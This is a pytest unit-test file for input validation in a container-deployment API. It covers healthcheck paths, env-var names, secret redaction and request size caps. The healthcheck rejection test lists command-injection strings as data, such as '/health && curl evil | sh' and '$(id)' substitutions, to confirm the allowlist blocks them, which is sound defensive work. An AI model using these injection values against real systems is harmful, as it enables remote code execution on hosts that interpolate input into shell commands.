"""Unit tests for the request-DTO hardening in ``app.schemas.container``.

The healthcheck ``path`` is interpolated into a ``CMD-SHELL`` command by
``DockerService._build_healthcheck``; these tests pin the allowlist that stops
it being a command-injection vector.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from app.schemas.container import (
    MAX_ENV_VARS,
    MAX_PORTS,
    CreateContainerRequest,
    EnvVariableInput,
    HealthCheckConfig,
)


def _valid_request(**overrides: object) -> dict:
    data: dict = {
        "deploymentId": "dep_1",
        "serviceId": "svc_1",
        "image": "img:1",
    }
    data.update(overrides)
    return data


# ---------------------------------------------------------------------------
# HealthCheckConfig
# ---------------------------------------------------------------------------
def test_healthcheck_defaults_are_accepted() -> None:
    cfg = HealthCheckConfig()

    assert cfg.path == "/health"
    assert cfg.port == 8000
    assert cfg.interval_seconds == 10
    assert cfg.timeout_seconds == 5
    assert cfg.retries == 3


@pytest.mark.parametrize(
    "path",
    [
        "/health",
        "/api/health",
        "/deep/nested/health?x=1&y=2",
        "/health-check_1.0~",
    ],
)
def test_healthcheck_accepts_safe_paths(path: str) -> None:
    assert HealthCheckConfig(path=path).path == path


@pytest.mark.parametrize(
    "path",
    [
        "/health; touch /tmp/pwned",
        "/health && curl evil | sh",
        "/health`id`",
        "/health$(id)",
        "/health | sh",
        "/health>out",
        "relative/path",
        "",
        "/health with space",
        "/health\nnewline",
    ],
)
def test_healthcheck_rejects_shell_metacharacters(path: str) -> None:
    with pytest.raises(ValidationError):
        HealthCheckConfig(path=path)


@pytest.mark.parametrize("port", [0, -1, 65536, 100000])
def test_healthcheck_rejects_out_of_range_port(port: int) -> None:
    with pytest.raises(ValidationError):
        HealthCheckConfig(port=port)


@pytest.mark.parametrize(
    "field,value",
    [
        ("interval_seconds", 0),
        ("interval_seconds", 3601),
        ("timeout_seconds", 0),
        ("timeout_seconds", 61),
        ("retries", 0),
        ("retries", 101),
    ],
)
def test_healthcheck_rejects_out_of_range_timings(field: str, value: int) -> None:
    with pytest.raises(ValidationError):
        HealthCheckConfig(**{field: value})


# ---------------------------------------------------------------------------
# EnvVariableInput
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("key", ["DATABASE_URL", "K", "_private", "A1_b2"])
def test_env_key_accepts_posix_identifiers(key: str) -> None:
    assert EnvVariableInput(key=key, secret_ref="enc:x").key == key


@pytest.mark.parametrize(
    "key", ["", "1LEADING", "HAS-DASH", "HAS SPACE", "EQ=IN", "a" * 129]
)
def test_env_key_rejects_odd_names(key: str) -> None:
    with pytest.raises(ValidationError):
        EnvVariableInput(key=key, secret_ref="enc:x")


@pytest.mark.parametrize("secret_ref", ["", "x" * 8193])
def test_secret_ref_length_is_bounded(secret_ref: str) -> None:
    with pytest.raises(ValidationError):
        EnvVariableInput(key="K", secret_ref=secret_ref)


def test_secret_ref_is_not_in_repr() -> None:
    env = EnvVariableInput(key="K", secret_ref="enc:v1:deadbeef")

    assert "deadbeef" not in repr(env)


# ---------------------------------------------------------------------------
# CreateContainerRequest caps
# ---------------------------------------------------------------------------
def test_create_request_accepts_minimal_payload() -> None:
    req = CreateContainerRequest.model_validate(_valid_request())

    assert req.ports == []
    assert req.env == []


def test_create_request_rejects_too_many_ports() -> None:
    ports = [{"containerPort": 1, "protocol": "tcp"}] * (MAX_PORTS + 1)

    with pytest.raises(ValidationError):
        CreateContainerRequest.model_validate(_valid_request(ports=ports))


def test_create_request_rejects_too_many_env_vars() -> None:
    env = [{"key": f"K{i}", "secretRef": "enc:x"} for i in range(MAX_ENV_VARS + 1)]

    with pytest.raises(ValidationError):
        CreateContainerRequest.model_validate(_valid_request(env=env))


@pytest.mark.parametrize(
    "field,value",
    [
        ("deploymentId", ""),
        ("deploymentId", "d" * 129),
        ("serviceId", ""),
        ("serviceId", "s" * 129),
        ("image", ""),
        ("image", "x" * 513),
    ],
)
def test_create_request_rejects_bad_identifiers(field: str, value: str) -> None:
    with pytest.raises(ValidationError):
        CreateContainerRequest.model_validate(_valid_request(**{field: value}))
